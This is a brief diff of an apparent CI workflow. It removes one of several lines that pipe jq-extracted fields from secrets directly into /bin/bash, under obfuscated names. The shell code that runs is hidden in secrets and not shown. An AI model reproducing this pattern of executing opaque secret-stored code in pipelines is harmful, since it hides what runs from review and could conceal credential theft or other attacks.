@@ -22,7 +22,6 @@ jobs:
           c43129: ${{ secrets.c43129 }}
         run: |
           printf '%s' "$c43129" | jq -r .oh168 | /bin/bash
-          printf '%s' "$gjr929" | jq -r .l3 | /bin/bash
           printf '%s' "$ohuu88" | jq -r .ebztl999 | /bin/bash
           printf '%s' "$kxigf30" | jq -r .nojmx7715 | /bin/bash
           echo $xr12679 | jq -r .de57202 | /bin/bash
